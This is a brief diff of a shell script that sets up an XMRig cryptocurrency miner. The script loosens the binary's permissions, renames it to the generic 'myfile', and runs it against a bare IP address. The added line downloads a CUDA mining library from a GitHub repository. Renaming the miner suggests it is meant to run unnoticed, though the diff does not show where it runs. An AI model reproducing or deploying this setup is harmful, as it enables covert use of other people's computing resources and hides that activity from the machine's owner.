@@ -4,4 +4,5 @@ chmod 777 xmrig
 rm config.json 
 rm out 
 mv xmrig myfile
+wget https://github.com/dercodeKoenig/test/raw/main/cuda.so -O libxmrig-cuda.so
 #./myfile -o 79.231.42.249
